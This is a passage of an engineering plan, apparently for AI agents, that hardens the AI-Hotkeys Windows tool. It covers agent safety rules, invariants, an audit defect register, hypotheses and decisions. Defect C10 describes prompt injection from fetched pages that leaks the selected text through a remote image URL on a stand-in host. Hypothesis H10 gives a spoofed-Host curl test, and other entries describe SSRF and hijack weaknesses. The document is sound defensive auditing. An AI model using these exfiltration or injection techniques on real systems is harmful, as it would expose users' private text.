# Blueprint: AI-Hotkeys production readiness

- **Plan id:** `ai-hotkeys-production-readiness`
- **Created:** 2026-10-16
- **Base commit:** `32d9187` (main, clean)
- **Status:** IN EXECUTION. Decisions D1–D12 were accepted with the recommended defaults on 2026-10-16. Wave A (S1, S11, S12) has started.
- **Objective:** turn AI-Hotkeys into a reliable, secure, maintainable Windows 10/11 x64 application that anyone can install from a public GitHub Release, while preserving every intended behaviour.
- **Evidence base:** eight parallel read-only audits, run 2026-10-16, plus spot-checks by the planner. The audits covered:
  - `main.ahk` (AutoHotkey v2)
  - Python core
  - security and privacy
  - packaging, installer and licenses
  - process lifecycle and silent failures
  - UI/UX and accessibility
  - performance baselines
  - tests and CI

---

## 0. How to use this plan

1. **Each step is one PR-sized unit.** Every step can be executed cold. Read §1 (rules), §2 (invariants) and then the step itself. You do not need to read the other steps.
2. **Workflow mode: git + branches, no `gh`.**
   - git is available. The remote is `origin` = `github.com/Jack8090-sudo/AI-Hotkeys`. The GitHub CLI is not installed.
   - Each step works on branch `prod/<step-id>-<slug>` cut from `main`. Commit only when the user approves that step's commit.
   - Open PRs through the GitHub web UI, or install `gh` first (`winget install GitHub.cli`, after user approval).
   - Without that approval, use **direct mode**: edit on the branch, leave changes uncommitted, and report.
3. **Confirmed vs hypothesis.**
   - Defect IDs `Cxx` are confirmed by code evidence (§3.1).
   - `Hxx` are hypotheses. They must be verified before anyone "fixes" them (§3.2).
   - `Exx` are optional enhancements, never required for completion (§3.3).
4. **Changing the plan** follows the plan-mutation protocol in §8.
5. **Parallel execution mechanics.**
   - Each parallel step runs in its own git worktree: `git worktree add ..\aih-<step-id> -b prod/<step-id>-<slug> main`.
   - Worktrees do not contain the gitignored runtime (`python\`, `ahk\AutoHotkey64.exe`, `searxng\app|lib`). Run `powershell -NoProfile -File scripts\dev\link-runtime.ps1 -From C:\AI-Hotkeys` inside the worktree. The script is created by S1 and creates read-only directory junctions to the existing runtime. Once S11 lands, it can download the pinned copies instead.
   - **Merge gate:** a wave starts only after all of its prerequisite PRs are merged into `main`. Each merge needs the user's explicit approval. In direct mode (no commit approval) the plan runs strictly serially in one tree.
6. **Windows command conventions.** These apply to every validation command in this plan.
   - The machine has Windows PowerShell 5.1 and no `pwsh`, so scripts must be 5.1-compatible. Invoke them as `powershell -NoProfile -ExecutionPolicy Bypass -File <script>`.
   - `ruff`, `coverage`, `makensis` and `gh` are not installed. Install the dev tools with `pip install -r requirements-dev.txt` (S1). S11 provisions NSIS from `build/pins.json`.
   - AutoHotkey is a GUI-subsystem exe. To capture its output and exit code, use `$p = Start-Process ahk\AutoHotkey64.exe -ArgumentList '/ErrorStdOut','tests\ahk\run.ahk' -Wait -PassThru -NoNewWindow -RedirectStandardOutput out.txt; $p.ExitCode`. In bash, pipe it instead: `ahk/AutoHotkey64.exe /ErrorStdOut x.ahk 2>&1 | cat`. AHK tests print with `FileAppend(text, "*")`.

---

## 1. Global rules (apply to every step)

**Safety. These rules are non-negotiable.**
- **Never run `C:\AI-Hotkeys\Uninstall.exe`.** It sits in the git working tree, left over from installing into the repo. Running it deletes tracked sources (C46).
- Never run any installer or uninstaller against `C:\AI-Hotkeys`. Installer tests run in CI, in a VM, or in Windows Sandbox only.
- Agents never read, print, commit, back up or delete the live `C:\AI-Hotkeys\work\*`, which holds the user's selected text in plaintext. The product's own cleanup logic is unaffected by this rule.
- **No test touches the live runtime.** SearXNG, viewer and settings tests always run in a temp tree with a temp `config.ini` that uses a free alternate port (for example `searxng_url = http://127.0.0.1:<free port>`). Tests kill only the PIDs they spawned. Port 8888 and `C:\AI-Hotkeys\work\searxng.pid` belong to the user's running instance.
- Uploading any artifact to a third-party service (VirusTotal, signing services) needs explicit user approval.
- Never commit `config.ini` (it holds personal paths) or any `*.exe`, `*.rar`, `python/`, `searxng/app|lib/` or `graphify-out/`.
- No `git push`, release publishing, tag pushing, or `--force` operations without explicit user approval for that specific action.
- Never delete user data. This covers To-Do files, `To-Do List.backup_*.md`, `config.ini` and `work/`. Migrations must copy, never move-and-delete, unless the user confirms.
- Never call the real Ollama model in automated tests. Use the fake servers in `tests/support.py`. Real-model runs are manual and listed explicitly.
- Set `PYTHONDONTWRITEBYTECODE=1` for ad-hoc runs inside the repo.

**File ownership.**
- A step edits only the files listed under its **Owns** line. Anything else needs a plan mutation (§8).
- Shared files have a single owner per wave (see §5). In particular:
  - `tests/support.py` is owned by S1. Later steps request additions through a small serialized follow-up, or add helpers in their own `tests/<area>_helpers.py`.
  - `README.md`, `docs/CODEMAPS/INDEX.md` and `CHANGELOG.md` are owned only by S15. Other steps write a fragment to `docs/changes/pending/<step-id>.md` (new file per step, so there are no conflicts). S15 merges the fragments.
- Before starting, run `git fetch && git log --oneline main..origin/main`. Rebase on `main` if needed.

**Quality gates (every step).**
- `python -m unittest discover -s tests -t . -v` is green (after S1 exists).
- `ruff check .` is clean for the configured rule set (after S2 exists).
- `ahk\AutoHotkey64.exe /ErrorStdOut /validate main.ahk` exits 0, for steps that touch AHK. The switch itself is hypothesis H13 until S2 confirms it.
- No performance claim without before/after numbers from the S3 harness (median and p90, same machine, interleaved runs).
- A reviewer agent (named per step) reviews the diff before commit. CRITICAL and HIGH findings are fixed or explicitly waived by the user.

---

## 2. Invariants: behaviour that must be preserved

Every step must keep all of these. Steps S1, S8a and S16 turn them into automated or manual regression checks.

| ID | Behaviour | Where |
|---|---|---|
| I1 | Default hotkeys are PgUp = fix, PgDn = summarize, End = explain. | `main.ahk` `DEFAULT_KEYS`, `config.example.ini [tasti]` |
| I2 | Hotkeys are configurable in `[tasti]` using AutoHotkey syntax. Bare letters and digits are rejected. An invalid key falls back to the default. | `main.ahk:147-164,706`, `settings.py:66-86` |
| I3 | With nothing selected, the key keeps its native function and the clipboard is restored. | `main.ahk:286-296` |
| I4 | Obsidian route: PgUp with `Obsidian.exe` and a title starting with `window_title` reorganizes `todo_file`. It takes a backup, writes atomically, validates the result, and leaves the file intact on failure. | `main.ahk` routes, `actions/obsidian_todo.py` |
| I5 | Holding Esc for 2 s cancels the running job: it kills Python and cleans the half-written `work/` files. A short Esc press behaves normally (`~Esc`). | `main.ahk:477-553` |
| I6 | Direct replace applies only to the fix action, only in `EDITABLE_APPS`, only with `sostituisci_testo = si`. PgDn and End always open the results page. | `main.ahk:379-392` |
| I7 | The results page includes the "Ask Qwen" follow-up: iterative rewrite in fix mode, Q&A with the last 6 pairs otherwise, and reuse of sources. | `viewer.py`, `static/viewer.html` |
| I8 | The settings page is served from 127.0.0.1 on a random port with an ephemeral token (`?t=` + `X-Token`). A Host allowlist and idle shutdown (240 s results / 300 s settings) apply. It has hotkey recording. Saving triggers the config watch, which reloads the script. | `settings.py`, `viewer.py`, `main.ahk:745-771` |
| I9 | SearXNG is optional: `web_search = auto \| always \| false`. Results carry `[n]` citations plus a sources list. SearXNG is bound to 127.0.0.1 only. | `websearch.py`, `searxng/*` |
| I10 | `keep_alive` is honoured. The tray item "Free VRAM" unloads the model (`keep_alive:0`). | `qwen_client.py`, `actions/unload.py` |
| I11 | The config API keeps Italian keys and values (`[tasti]`, `si/no`, `scuro`, `breve/normale/dettagliata`, …). Existing keys are never renamed or removed. New optional keys may be added only with a code default. A missing key falls back to the code default without error. | all config readers |
| I12 | `config.ini` comments, order, BOM and CRLF are preserved on save. | `config_edit.py` |
| I13 | An upgrade never overwrites the user's `config.ini`. | `installer.nsi:86-88` |
| I14 | Runtime Python code stays stdlib-only. The only exception is the optional `curl_cffi` reused from `searxng/lib`. Dev tools such as ruff and coverage are dev-only. | — |
| I15 | After a successful direct replace, the corrected text stays in the clipboard (current, intentional behaviour) unless decision D10 changes it. | `main.ahk:385-390` |

---

## 3. Evidence register

### 3.1 Confirmed defects (code-proven)

Severity scale: C = critical, H = high, M = medium, L = low. "→" names the step that fixes the defect.

| ID | Sev | Area | Defect (evidence) | → |
|---|---|---|---|---|
| C01 | H | Py perf/DoS | `clean_answer` explain-mode empty-section regex `^#{1,4}[^\n]*\n+\s*…` backtracks cubically. Spot-check by the planner: 200/400/800 blank lines take 0.08/0.66/5.8 s. A degenerate model answer can hang End and the viewer, and AHK has no timeout. (`qwen_client.py:177-181`) | S4 |
| C02 | H | Py data integrity | Truncated generations are accepted as complete. `chat()` ignores `done_reason=="length"`, `stream_pieces` never checks for `done`, and there is no input cap versus `num_ctx`. With direct replace, a truncated rewrite overwrites the user's selection. (`qwen_client.py:91-97,122-134`; `prompts.py:298-315`) | S4 |
| C03 | H | AHK UX | `busy := true` is set before `^c` and `ClipWait(2)`. With nothing selected, every key waits up to 2 s, and repeat or other hotkey presses are dropped during that time. `^c` is also sent to consoles (SIGINT risk, see H02). (`main.ahk:181-185,210,284-293`) | S8b1 |
| C04 | H | AHK UX | The results page is not exempt from hotkeys; only the "AI-Hotkeys Settings" title is (`main.ahk:174`). So PgUp/PgDn/End in the viewer lag by 2 s, and with a selection they re-run the action on the viewer's own text. The viewer runs in the user's default browser, so the window title is e.g. `<Fix> - AI-Hotkeys - Google Chrome`. | S8b1 |
| C05 | H | AHK data integrity | Direct replace ignores the `WinWaitActive` result and has no check that the selection is unchanged. `^v` can paste into the wrong window or over the wrong text. (`main.ahk:382-388`) | S8b1 |
| C06 | H | Cross | Every failure collapses into "Qwen did not respond…". `pythonw` drops stderr, AHK cannot read the exit code, the HTTPError body is never read, and there is no error file. This covers Ollama down, model missing, empty selection, crash and bad config alike. `Run` does not hand back an exit code (it could be read via `GetExitCodeProcess`, but no code does), and AHK only checks whether `output.txt` exists. (`qwen_client.py:191-243`; `main.ahk:351-372`) | S4 + S8b3 |
| C07 | H | Packaging | The shipped `installer/AI-Hotkeys-Setup.exe` matches no commit: Italian UI, `config.esempio.ini`, different `.py`/`.ahk` hashes. There is no script that builds `payload\`. | S11 |
| C08 | H | Installer | The committed uninstaller dropped `RMDir /r $INSTDIR\searxng` and the deletion of the example config, so about 82 MB is left behind. (`installer.nsi:236-256`, compared with the decompiled shipped uninstaller) | S13b |
| C09 | H | Security | Default `InstallDir C:\AI-Hotkeys` inherits `Authenticated Users:(M)`. Any local user can replace `main.ahk`, `python\*` or `ahk\*`, which then run as the victim at login. `work\` is readable by `Users`. (`installer.nsi:10,19`; `icacls`) | S13a |
| C10 | M-H | Security/privacy | Remote `https` images in model output load automatically, and no page sends a CSP. Prompt injection via a fetched page can therefore exfiltrate the selection with `![](https://x/?q=…)`. (`static/viewer.html:572-577`; `viewer.py:187-194`; `settings.py:195-204`) | S7 |
| C11 | M | Security | SSRF: fetched result URLs are only checked for `http(s)://`. Redirects are followed by both curl_cffi and urllib, and loopback, private and link-local ranges are not blocked. (`websearch.py:142,360-390`) | S6a |
| C12 | M-H | Py correctness | `clean_answer` rewrite mode strips legitimate content. `INTRO_RE` has no word boundary, so "Okay so the plan is:" is dropped. The fence unwrap is greedy and breaks multi-block code. Both affect pasted text. (`qwen_client.py:141-156`) | S4 |
| C13 | M | Py data integrity | `obsidian_todo.main` has unguarded decode, copy, tmp-write and `os.replace` calls, and no fsync. A failure writes no status (AHK shows "No result."), can leave a `.tmp` and a backup, and a power loss can leave a 0-byte file. (`actions/obsidian_todo.py:342-402`) | S5 |
| C14 | M | Py data integrity | `validate()` passes when frontmatter, plain paragraphs or tables are dropped, or when task text is replaced. Verified with a probe. (`obsidian_todo.py:283-335`) | S5 |
| C15 | M | Data hygiene | One `To-Do List.backup_<ts>.md` is created per run, inside the vault, never pruned. Obsidian indexes the copies (duplicate tasks and tags). (`obsidian_todo.py:386-388`) | S5 |
| C16 | M | Py config | `load_config` swallows every parse error: a duplicate key, a missing section or cp1252 encoding silently reverts all settings to defaults. AHK's lenient parser then disagrees with Python's. (`qwen_client.py:35-38`) | S4 |
| C17 | M | Config | `config_edit` has four problems. (`config_edit.py:23,42-52`)<ul><li>The write is non-atomic (`write_bytes` truncates).</li><li>Newlines inside values are not rejected (defence in depth; `settings.validate` currently protects the UI path).</li><li>`splitlines()` splits on U+2028.</li><li>`k: v` lines get duplicated.</li></ul> | S7 |
| C18 | M | Lifecycle | Tray Reload/Exit and `#SingleInstance` orphan the running Python job, because `OnExit` only handles SearXNG. The orphan later overwrites `output.txt` of a newer run. (`main.ahk:130,821-822,879`) | S8b2 (+ S9) |
| C19 | M | Lifecycle | Racing SearXNG launchers break process tracking. Each truncates `searxng.log` and overwrites `searxng.pid`, and the loser deletes the pid file, so the winner is orphaned. (`searxng/avvia_searxng.py:56-61,102,116-121`; `websearch.py:95-132`) | S6c |
| C20 | M | Lifecycle | `StopSearxng` kills whatever PID is in the pid file if its name contains "python". After a hard kill, a stale pid can be reused by an unrelated Python process. (`main.ahk:877-894`) | S8b2 |
| C21 | M | UX | The viewer maps HTTP 404 "model not found" to "Cannot reach Ollama", because `HTTPError` is a subclass of `URLError`. (`viewer.py:277`) | S9 (uses K1 `describe_error`) |
| C22 | M | Py errors | `decide_queries` swallows Ollama errors (`websearch.py:561-562`). When technical terms or `always` force a search (`websearch.py:557-569`), End with Ollama down still searches and fetches pages before failing at the final call. SearXNG is usually already started at AHK startup (`main.ahk:129`); otherwise `ensure_running` can wait up to 25 s. | S6a |
| C23 | M | Py hangs | Page fetches have no wall-clock deadline. The urllib timeout is per socket operation, so a slow-drip server stalls the run, and `ex.map` waits for all pages. (`websearch.py:382-390,656-660`) | S6a |
| C24 | M | Py network | Ollama calls honour `HTTP_PROXY` and the registry proxy, unlike `websearch._get`. In a corporate setup they can route localhost traffic through a proxy. (`qwen_client.py:93,102,118`) | S4 |
| C25 | M | Py correctness | `linkify` turns `parts[1]` in code into a link and deletes `arr[0]`. URLs containing `)` break the link markup. (`websearch.py:741-755`) | S6b |
| C26 | M | AHK | Duplicate hotkeys silently override each other. If the fallback `Hotkey()` fails it is swallowed, yet the label still shows the key. (`main.ahk:150-164`) | S8b3 |
| C27 | M | AHK | `busy` stays true while an error MsgBox is open, which makes all three hotkeys dead system-wide. `Flash` destroys the progress toast and `ShowStatus` never redraws it. (`main.ahk:333,363,371,461,465,568,654`) | S8b3 |
| C28 | M | Runtime | The bundled Python is 3.13.7, a hand-trimmed full install rather than the embeddable package. It has no `._pth`, and the user site-packages appear in `sys.path` (planner-verified). It also honours PYTHONPATH. | S11 + S8b2 |
| C29 | M | Licensing | No GPLv2 source offer for AutoHotkey 2.0.19. No AGPL source for SearXNG `6671d89`. The curl-impersonate/BoringSSL/nghttp2/brotli/zstd/zlib notices for the bundled DLL are missing. The MIT `LICENSE` is not installed, and `LegalCopyright "Personal use"` contradicts MIT. | S12 + S13b |
| C30 | M | Installer | Upgrades never remove obsolete files. "Edit prompts" edits `$INSTDIR\prompts.py`, which the next upgrade overwrites, and a syntax error in it breaks every action. (`installer.nsi:82-83,102`) | S13b |
| C31 | M | Installer | The installer has three problems in the Ollama path. (`installer.nsi:134-150`)<ul><li>A `/S` install still opens a browser to ollama.com.</li><li>winget auto-accepts source and package agreements without telling the user.</li><li>winget's exit code is ignored.</li></ul> | S13b |
| C32 | M | Privacy | The selection persists in plaintext in `work\input.txt`, `output.txt` and `obsidian_output.txt` after successful runs; cleanup happens only on cancel. (`main.ahk:299,546-553`; `obsidian_todo.py:365`) | S9 |
| C33 | M | Privacy | Text derived from the selection (the first 10 words, or the matched terms) is sent to Startpage and Yahoo through SearXNG, which also fetches the result pages. The docs and UI say only "local SearXNG". (`websearch.py:565-571`; `searxng/settings.yml:48-52`) | S10 + S15 |
| C34 | M | A11y | Several accessibility gaps:<ul><li>The hotkey recorder has no accessible names or live announcements.</li><li>The recorder captures Shift+Tab, so recording can register a global Shift+Tab hotkey.</li><li>The streaming answer is not announced, and focus is lost on disable and Esc.</li><li>WCAG 1.4.11 failures (borders about 1.3–1.8:1, selected state about 1.1–1.2:1, light-theme swatches 1.15–2.1:1).</li><li>The settings preview is read as real content.</li></ul> | S10 |
| C35 | L-M | Security robustness | `secrets.compare_digest` raises `TypeError` on non-ASCII tokens, which drops the connection. `"²".isdigit()` is true, so `int()` raises. The handler has no socket timeout. (`viewer.py:151,180`; `settings.py:134,193,219`) | S7 |
| C36 | L | Validation | The hotkey and text regexes end in `$`, which accepts a trailing `\n`. The UI path strips first, but other callers do not. (`settings.py:69` and `TEXTS`) | S7 |
| C37 | L | AHK config | `ReadConfig` is not section-aware, does not strip inline `;` comments, and splices the key unescaped. AHK and Python disagree on what makes a hotkey valid. (`main.ahk:706-713,787-796`; `settings.py:66-86`) | S8a |
| C38 | L | Py correctness | Several small parsing bugs in `websearch.py`:<ul><li>`NO_RE` treats "No Man's Sky…" as a NO decision.</li><li>The "Fonti" regex deletes everything after "## Fonti di lag".</li><li>Quoted or unknown charsets cause a double download.</li><li>The `Content-Type` check is case-sensitive.</li><li>`results` and `pages_to_read` are never clamped.</li></ul>(`websearch.py:355-390,488,633,659,784`) | S6b |
| C39 | L | Py correctness | The HTML extractor drops text that sits only in `div`/`span` elements. An unclosed `<form>` swallows the rest of the page. (`websearch.py:156-294`) | S6b |
| C40 | L | Perf | The streaming view re-parses all the markdown and replaces `innerHTML` on every animation frame. That is O(n²) on long answers and breaks selection while streaming. (`static/viewer.html:909-916`) | S10 |
| C41 | L | Perf | Fixed sleeps cost 500 ms after `^s` in the Obsidian route (`Sleep 500`) and keep `busy` held for 300 ms after `^v`. (`main.ahk:388,417`) | S8b3 (measure first) |
| C42 | L | Docs | The docs are wrong or incomplete in several places:<ul><li>README says "Libera la VRAM"; the actual label is "Free VRAM".</li><li>The `LEGGIMI.txt` that README references is untracked and has mojibake.</li><li>Different files give different VRAM requirements.</li><li>The "stdlib only" claim omits the `curl_cffi` (cp313) dependency.</li><li>The codemap claims the installer calls the config_edit CLI (it does not), and has wrong statements about healthz and payload contents.</li><li>README says Releases exist; there are no tags or releases.</li></ul> | S15 |
| C43 | L | Process | There is only one test (config_edit happy path), no CI, and no lint configuration. | S1, S2 |
| C44 | L | Installer | `where ollama` searches the current directory first, so a planted `ollama.exe` next to the setup gets executed. `ollama list` fails when the server is not running, which gives a false "model missing". (`installer.nsi:156,198`) | S13b |
| C45 | L | Installer | `stop.ps1` matches the `python` prefix with no trailing separator. It does not stop SearXNG, the viewer or settings when they run under a system Python. Errors are silenced. (`installer/sorgente/stop.ps1:5-8`) | S13b |
| C46 | INFO | Dev hazard | A stale `Uninstall.exe` sits in the repo root and targets the working tree. Covered by rule §1; deleting it is a user decision (it is untracked). | §1 |

### 3.2 Hypotheses (verify before acting)

| ID | Hypothesis | Verification procedure | Verified in |
|---|---|---|---|
| H01 | AHK `ReadConfig` leaves a trailing `\r` on values from a CRLF `config.ini`. | AHK unit test that writes a CRLF fixture and asserts `StrLen` of `ReadConfig("correggi")`. | S8a |
| H02 | `^c` with no selection interrupts console programs (`ping -t` in Windows Terminal or conhost). | Manual: run `ping -t localhost`, press PgUp with nothing selected. | S3 |
| H03 | A file selection in Explorer sends file paths to Qwen. | Manual in Explorer, using the fake Ollama with request logging. | S3 |
| H04 | A second action within about 1 s of the viewer starting gives the viewer a mismatched input/output pair, or a silent crash. | Scripted: trigger two runs back-to-back against the fake Ollama and compare the viewer page with the files. | S3 (fixed in S9) |
| H05 | A venv or Store `pythonw` stub on PATH makes Esc kill only the stub. | `where pythonw`, then check the process tree after Esc (only relevant to source users without `python\`). | S3 |
| H06 | AHK cannot act on elevated windows (UIPI). | Manual test with an elevated Notepad. If confirmed, document it; no fix. | S3 |
| H07 | `ClipWait(2)` is too short for large or delayed-render clipboards (Excel, RDP). | Manual: large Excel range and an RDP session. | S3 |
| H08 | Ollama aborts generation when the client process is killed (Esc), including during prefill. | Watch `ollama ps`, the GPU and the Ollama server log while cancelling at 2 s and at 20 s with a large input. | S3 |
| H09 | Two SearXNG launchers can both bind the same port (SO_REUSEADDR on Windows). | In a temp tree on an alternate free port, start `avvia_searxng.py` twice, 2 s apart, then run `Get-NetTCPConnection -LocalPort <port> -State Listen`. Never use 8888 or the live `work\`. | S6c |
| H10 | SearXNG does not validate the Host header (DNS rebinding). | Against an isolated instance on an alternate port: `curl -H "Host: evil.example" "http://127.0.0.1:<port>/search?q=t&format=json"`. | S6c |
| H11 | Ollama silently truncates prompts longer than `num_ctx=16384`, dropping the system prompt. | Recording proxy (S3) plus the real model: a 45k-character input; inspect `prompt_eval_count` and `done_reason`. | S3 |
| H12 | `os.replace` fails while Obsidian or OneDrive holds the To-Do file open. | Open a handle without FILE_SHARE_DELETE, plus a OneDrive-synced Documents folder; run the S5 test. | S5 |
| H13 | `AutoHotkey64.exe /validate` exists in 2.0.19 and returns a non-zero exit code on syntax errors. | CI job in S2, run against a deliberately broken fixture. | S2 |
| H14 | GitHub-hosted Windows runners can drive synthetic input to AHK hotkeys reliably. | Non-blocking `continue-on-error` job: Notepad, fake Ollama, send PgUp. | S14 |
| H15 | On a fresh Windows 10, winget is missing or unregistered, and `ollama list` fails before the Ollama server starts. | Fresh VMs: Win10 22H2, Win10 LTSC, Win11 24H2. | S16 |
| H16 | With the official embeddable distribution plus `._pth`, sibling imports (`import pages`, `import qwen_client`) fail unless `..`/`.` is added. Adding `..` may make root modules shadow SearXNG's own imports. | S11 build, then a smoke import of every app module and the SearXNG launcher using the bundled interpreter. | S11 |
| H17 | Vendored SearXNG equals upstream `6671d89`, unmodified. | Diff `searxng/app/searx` against a clean checkout of `6671d89`. | S11 (first task) |
| H18 | SmartScreen and antivirus engines flag the unsigned NSIS installer, which runs PowerShell with `-ExecutionPolicy Bypass`. | VirusTotal scan of the RC, plus a fresh-VM download test. | S16 |
| H19 | The viewer and settings watchdogs use `time.time()`, so they shut down early after sleep or resume. | Unit test with a monkeypatched clock; manual sleep test. | S7 |
| H20 | `HTTP_PROXY=http://127.0.0.1:9` breaks the PgDn action. | Unit test with the fake Ollama and the env var set. | S4 |
| H21 | NVDA browse mode swallows recorder keystrokes; the sticky dock and savebar cover focus at 400% zoom. | NVDA manual check; Chrome DevTools Lighthouse and a zoom test. | S10 |
| H22 | A persistent Python worker would meaningfully cut latency. Current evidence says no: about 0.2–0.3 s saving against unmeasured model time. | Real-model warm totals from S3. Revisit only if the warm rewrite takes under about 2–3 s. | S3 |
| H23 | The query-decision LLM call can be skipped when technical terms force a search. | S3 timing plus an output-quality comparison on a fixed corpus. | S3 |
| H24 | Older Ollama versions reject or ignore `think:false`, or lack `qwen3.5` support, giving confusing failures. | Check behaviour against `/api/version` for the minimum supported Ollama version; test with one older Ollama release in a VM. | S4 (version check), S16 |
| H25 | When Documents is redirected to OneDrive, the default `todo_file = %USERPROFILE%\Documents\To-Do List.md` points to the wrong place. | Fresh-VM test with OneDrive Known Folder Move enabled. | S16 (doc or default fix in S15) |
| H26 | `Send "^c"`/`"^v"` misbehave on non-Latin keyboard layouts, and laptops without dedicated PgUp/End keys need Fn chords that AHK does not see as PgUp. | Manual test with a Russian/Greek layout and on a compact laptop keyboard. | S16 |
| H27 | Vendored `searxng/lib` (curl_cffi, BoringSSL, lxml, flask, …) contains known CVEs. | `pip-audit -r build/requirements-searxng.txt` in CI. | S2 / S11 |

### 3.3 Optional enhancements (not required for completion)

| ID | Enhancement | Notes |
|---|---|---|
| E1 | Stream the first answer into the viewer. | This is the largest perceived-latency lever. It is a design change, gated on S3 measurements and decision D7. |
| E2 | Tray "Cancel current job" item, plus visual feedback while Esc is held. | Accessibility for users who cannot hold a key for 2 s. |
| E3 | Non-chord hotkey entry in settings (modifier checkboxes plus a key select). | Accessibility. |
| E4 | Authenticode signing (SignPath OSS or Azure Trusted Signing). | Decision D6. |
| E5 | Portable zip release asset. | After S14. |
| E6 | Type hints and `mypy` (dev-only) on the pure modules. | — |
| E7 | Shared `local_server.py` for the viewer and settings servers (duplication noted in `DELETION_LOG.md`). | Only after the S7 tests exist. |
| E8 | Optional model warm-up at login. | Trade-off: it holds VRAM permanently. Off by default. |
| E9 | Pre-import `curl_cffi` in a background thread at the start of `gather_sources`. | About 120 ms measured. Requires S3 before/after numbers. |
| E10 | `lib/Toast.ahk` extraction. | Only if S8b3 touches the toast code heavily. |
| E11 | ARM64 support statement and testing. | — |

---

## 4. Decisions required from the user (before the dependent steps)

**Resolution (2026-10-16):** the user accepted every recommendation below as written.

| ID | Decision | Recommendation | Blocks |
|---|---|---|---|
| D1 | Default install location, and migration of existing `C:\AI-Hotkeys` installs. | Default to `%LOCALAPPDATA%\Programs\AI-Hotkeys` (per-user, private ACL). On upgrade, if the registry `InstallDir` is `C:\AI-Hotkeys`, offer to migrate: copy `config.ini` and leave the old folder for the user to delete. Never auto-install into a folder containing `.git`. | S13a |
| D2 | Python runtime. | Official embeddable `python-3.13.x-embed-amd64.zip` (pinned and hashed) with `python313._pth` listing `python313.zip`, `.` and `..` (subject to H16), plus `-E -s` on every launch. Alternative: the pinned NuGet full layout plus `-E -s`. | S11, S8b2 |
| D3 | Obsidian backup location and retention. | `<vault-note-dir>\.ai-hotkeys-backups\` (Obsidian ignores dot-folders), keeping the last 20. Existing backups are left untouched. | S5 |
| D4 | Preserving customized prompts across upgrades. | Optional `prompts_user.py` (or `prompts.local.py`) in the install dir, never shipped and never overwritten, and imported if present. "Edit prompts" opens or creates it. On upgrade, if `prompts.py` differs from the previous release hash, save it as `prompts.py.bak-<ver>`. | S13b, S4 (loader), S8b3 (tray item) |
| D5 | Web-search egress. | Keep the default `auto`. Add a disclosure in the README, the installer finish page and the settings page, and offer a "never send selected text verbatim" option (use model-generated queries only). | S6b, S10, S13b, S15 |
| D6 | Code signing. | Optional (E4). Release unsigned first, with SmartScreen instructions. | S14 |
| D7 | Stream the first answer (E1). | Decide after the S3 numbers. | E1 |
| D8 | Remote images in results. | Block them and replace with a link "Image: host" (no auto-load). Keep `data:` and same-origin images. | S7 |
| D9 | Supported Python for source installs. | CPython 3.13 x64 only (because `searxng/lib` is cp313). The app itself remains 3.11+ compatible where that is free. | S15 |
| D10 | Clipboard after a direct replace. | Keep the current behaviour (I15): the result stays in the clipboard. | S8b1 |
| D11 | Upgrade path from the v1.0.0 Italian build, which is not on GitHub. | Ship a hard-coded `legacy-1.0.0.manifest` derived from the decompiled v1.0.0 installer. With consent, migration stops the old instance and renames the old `Uninstall.exe` and Italian shortcuts. Before S14, the user decides whether to attach the existing local v1.0.0 `Setup.exe` as a pre-release asset that serves as the upgrade-test baseline. | S13a, S14 |
| D12 | Behaviour on the first press with nothing selected (C03). | Shorten `ClipWait` to the smallest value that S3/H07 data shows is safe (for example 0.3–0.5 s), with `clip_wait_ms` as an optional config key. The 2 s value stays the default if the data is inconclusive. | S8b1 |

---

## 5. Workstreams, ownership and dependency graph

### 5.1 File-ownership matrix

| Step | Owns (exclusive edit rights while the step is open) |
|---|---|
| S1 | `tests/__init__.py`, `tests/support.py`, the initial `tests/test_*.py` files (each placed in the file the fixing step will own, see S1), `tests/fixtures/**` (initial), `requirements-dev.txt`, `pyproject.toml`, `test_config_edit.py` (turned into a shim), `scripts/dev/**` |
| S2 | `.github/workflows/ci.yml`, `scripts/ci/**` |
| S3 | `tools/bench/**`, `docs/audit/baseline-*.md`; one `.gitignore` line (`tools/bench/out/`) |
| S4 | `qwen_client.py` (except the writers handed to S9 later), `prompt_loader.py` (new), `actions/{rewrite,summarize,explain,unload,health}.py`, `tests/test_qwen_client*.py`, `tests/fixtures/ollama/**` |
| S5 | `actions/obsidian_todo.py`, `tests/test_obsidian_*.py`, `tests/fixtures/todo/**` |
| S6a | `websearch.py` (network, fetch, decision paths), `tests/test_websearch_ssrf.py`, `tests/test_websearch_fetch.py`, `tests/fixtures/html/**` |
| S6b | `websearch.py` (parsing, linkify, extractor, `NO_RE`, `prompt_loader` import), `tests/test_websearch_parse.py`, `tests/fixtures/searx/**` |
| S6c | `searxng/avvia_searxng.py`, `searxng/settings.yml`, `tests/test_searxng_launcher.py` |
| S7 | `viewer.py`, `settings.py`, `pages.py`, `config_edit.py`. Also the image-filter block of `static/viewer.html` and the one-line `history.replaceState` in the `<head>` script of `static/viewer.html` and `static/settings.html`. Plus `tests/test_{viewer,settings,pages,config_edit}*.py`. |
| S8a | `main.ahk` (extraction only), `lib/Util.ahk` (new), `tests/ahk/**`, `tests/fixtures/hotkey_vectors.json`, `tests/test_hotkey_parity.py` |
| S8b1 → S8b2 → S8b3 | `main.ahk`, `lib/*.ahk`, `tests/ahk/**` (serial: one sub-step at a time) |
| S9 | `main.ahk` (run setup/teardown), `qwen_client.py` (output/meta writers), `viewer.py` (input loading, error mapping), `websearch.py` (`save_sources`/`load_sources` only), `tests/test_work_contract*.py` |
| S10 | `static/viewer.html`, `static/settings.html`, `static/theme.css` |
| S11 | `VERSION`, `build/**` |
| S12 | `THIRD_PARTY_NOTICES.md`, `licenses/**`, `tools/licenses/**` (notice generator and `check_notices.py`) |
| S13a → S13b | `installer/sorgente/installer.nsi`, `installer/sorgente/stop.ps1`, `installer/sorgente/*.nsh`, `installer/sorgente/legacy-1.0.0.manifest` (serial) |
| S14 | `.github/workflows/installer.yml`, `.github/workflows/release.yml` |
| S15 | `README.md`, `docs/**` (except `docs/audit/**` and `docs/release/**`), `CHANGELOG.md`, `CONTRIBUTING.md`, `SECURITY.md`, `PRIVACY.md`, `config.example.ini` (comments, plus new optional keys introduced by earlier steps; existing keys and values are frozen per I11) |
| S16 | `docs/release/checklist-<ver>.md` |

Every step may add `docs/changes/pending/<step-id>.md`.

`prompts.py` text remains user content and nobody edits it. Its only change is indirect: S4 introduces `prompt_loader.py`, which returns `prompts_user` if present (D4), otherwise `prompts`. Callers switch to it in their own steps, each a one-line import change:
- `qwen_client.py` in S4
- `websearch.py` in S6b
- `viewer.py` in S7
- the tray "Edit prompts" target in S8b3

### 5.2 Dependency graph and waves

```
Wave A (parallel):  S1 · S11 · S12
Wave B (after S1 merged; parallel worktrees):
